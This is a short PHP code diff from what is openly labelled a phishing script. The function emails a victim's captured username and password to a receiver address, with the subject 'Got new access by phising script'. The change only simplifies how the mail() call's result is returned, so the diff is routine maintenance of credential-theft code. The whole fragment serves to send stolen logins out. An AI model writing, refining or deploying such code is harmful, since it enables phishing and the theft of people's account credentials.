@@ -6,9 +6,7 @@
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
 		$message .= "and password is ". $password;
-		$sent =  mail($reciever, $subject, $message);
-		if($sent == true) return true;
-		 else return false;
+		return mail($reciever, $subject, $message);
 	}
 	
 	if(mail_sender()){
